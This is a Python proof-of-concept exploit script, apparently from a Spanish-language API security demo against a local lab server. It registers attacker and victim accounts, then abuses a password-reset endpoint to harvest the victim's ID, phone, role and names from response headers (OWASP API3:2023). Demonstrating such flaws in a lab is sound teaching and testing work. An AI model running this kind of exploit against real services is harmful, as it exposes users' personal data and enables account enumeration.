import time
import requests

BASE_URL = "http://localhost:8091"

USERS = {
    "attacker": {
        "username": "Atacantee_video_3",
        "password": "attacker123",
        "phone_number": "12845555444",
        "first_name": "Attacker",
        "last_name": "User"
    },
    "victim": {
        "username": "Defensorr_video_3",
        "password": "vict66858484",
        "phone_number": "4554455774",
        "first_name": "Victim",
        "last_name": "Sensitive"
    }
}

def slow_print(msg, delay=0.5):
    print(msg)
    time.sleep(delay)

def separator(title=""):
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

def register_user(user_data):
    slow_print(f"ğŸ“ Registrando: {user_data['username']}", 0.3)
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"âœ… Usuario creado\n", 0.3)
            return True
        else:
            slow_print(f"âš ï¸  Error: {r.status_code}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return False

def get_token(username, password):
    slow_print(f"ğŸ”‘ Obteniendo token: {username}", 0.3)
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"âœ… Token obtenido\n", 0.3)
            return token
        else:
            slow_print(f"âŒ Error: {r.status_code}\n", 0.3)
            return None
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return None

def reset_password_request(token, target_username):
    slow_print(f"ğŸ” Solicitando reset de password para: {target_username}", 0.5)
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "username": target_username
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/reset-password",
            json=payload,
            headers=headers
        )
        
        slow_print(f"\nğŸ“¡ Respuesta [{r.status_code}]: {r.json().get('detail', r.text)}", 0.3)
        
        slow_print(f"\nğŸ“‹ HEADERS DE RESPUESTA:", 0.3)
        
        leaked_data = {}
        interesting_headers = [
            "X-User-Id", "X-User-Phone", "X-User-Role", 
            "X-User-FirstName", "X-User-LastName"
        ]
        
        for header in interesting_headers:
            if header in r.headers:
                value = r.headers[header]
                leaked_data[header] = value
                slow_print(f"   ğŸš¨ {header}: {value}", 0.2)
        
        if not leaked_data:
            slow_print(f"   âœ… No se encontraron headers con informaciÃ³n sensible", 0.3)
        
        slow_print("")
        
        return r.status_code, leaked_data
        
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return None, {}

def main():
    separator("ğŸš¨ EXPLOIT NUEVO LEVEL - INFORMATION DISCLOSURE VIA HEADERS")
    
    slow_print("ğŸ“‹ Vulnerabilidad a explotar:")
    slow_print("   API3:2023 - Broken Object Property Level Authorization")
    slow_print("   â†’ Headers de respuesta filtran informaciÃ³n sensible de otros usuarios\n")
    
    separator("PASO 1: Crear usuarios")
    
    if not register_user(USERS["attacker"]) or not register_user(USERS["victim"]):
        slow_print("âŒ No se pudieron crear usuarios. Abortando...\n")
        return
    
    separator("PASO 2: AutenticaciÃ³n del atacante")
    
    attacker_token = get_token(USERS["attacker"]["username"], USERS["attacker"]["password"])
    
    if not attacker_token:
        slow_print("âŒ No se pudo obtener token. Abortando...\n")
        return
    
    separator("PASO 3: InformaciÃ³n objetivo (vÃ­ctima)")
    
    slow_print(f"ğŸ¯ DATOS DE LA VÃCTIMA (deberÃ­a ser privado):")
    slow_print(f"   Username: {USERS['victim']['username']}")
    slow_print(f"   TelÃ©fono: {USERS['victim']['phone_number']}")
    slow_print(f"   Nombre: {USERS['victim']['first_name']} {USERS['victim']['last_name']}\n")
    
    separator("PASO 4: EXPLOTAR - Solicitar reset con username ajeno")
    
    slow_print("âš ï¸  Atacante intenta reset de password de la vÃ­ctima")
    slow_print(f"   Token usado: de {USERS['attacker']['username']}")
    slow_print(f"   Username objetivo: {USERS['victim']['username']}\n")
    
    status_code, leaked_data = reset_password_request(
        attacker_token, 
        USERS["victim"]["username"]
    )
    
    separator("ğŸ“Š ANÃLISIS DE VULNERABILIDAD")
    
    print("\n" + "="*70)
    
    if leaked_data:
        print("ğŸš¨ğŸš¨ğŸš¨ VULNERABILIDAD CONFIRMADA ğŸš¨ğŸš¨ğŸš¨")
        print("="*70)
        slow_print("\n   âŒ FILTRACIÃ“N DE INFORMACIÃ“N SENSIBLE:")
        slow_print(f"   âŒ Se filtraron {len(leaked_data)} campos en los headers HTTP")
        slow_print(f"   âŒ Un atacante puede enumerar informaciÃ³n de CUALQUIER usuario\n")
        
        slow_print(f"   ğŸ“¦ DATOS FILTRADOS DE '{USERS['victim']['username']}':")
        for header, value in leaked_data.items():
            slow_print(f"      â€¢ {header.replace('X-User-', '')}: {value}")
        
        slow_print(f"\n   ğŸ’¸ IMPACTO:")
        slow_print(f"      â€¢ ExposiciÃ³n de PII (informaciÃ³n personal identificable)")
        slow_print(f"      â€¢ User enumeration facilitado")
        slow_print(f"      â€¢ ViolaciÃ³n de privacidad de usuarios")
        slow_print(f"      â€¢ InformaciÃ³n Ãºtil para ataques de ingenierÃ­a social\n")
        
        slow_print(f"   ğŸ” VECTOR DE ATAQUE:")
        slow_print(f"      1. Atacante autentica con su propia cuenta")
        slow_print(f"      2. Intenta reset password de otros usuarios")
        slow_print(f"      3. Aunque falla (403), los headers filtran informaciÃ³n")
        slow_print(f"      4. Puede enumerar TODOS los usuarios del sistema\n")
        
    else:
        print("âœ… API SEGURA - NO HAY FILTRACIÃ“N")
        print("="*70)
        slow_print(f"\n   âœ… No se filtraron datos sensibles en los headers")
        slow_print(f"   âœ… La respuesta de error no expone informaciÃ³n\n")
    
    separator("âœ… FIN DEL EXPLOIT NUEVO LEVEL")
    
    slow_print(f"ğŸ’¡ Usuario atacante: {USERS['attacker']['username']}")
    slow_print(f"ğŸ’¡ Usuario vÃ­ctima: {USERS['victim']['username']}")
    slow_print(f"ğŸ’¡ Campos filtrados: {len(leaked_data)}/5\n")

if __name__ == "__main__":
    main()